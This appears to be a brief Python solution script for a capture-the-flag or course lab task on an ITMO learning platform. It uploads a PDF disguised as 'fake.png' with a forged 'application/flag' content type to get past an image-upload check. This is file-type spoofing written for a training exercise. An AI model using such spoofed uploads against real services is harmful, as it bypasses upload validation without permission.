import requests

url = "https://933fe64d-30f5-40b5-a1af-6601572725ae-discover-image.web.lms.itmo.xyz/upload"

# Загружаем поддельный PNG (который на самом деле PDF)
with open("fake.png", "rb") as f:
    files = {"file": ("fake.png", f, "application/flag")}

    response = requests.post(url, files=files)

print(response.text)
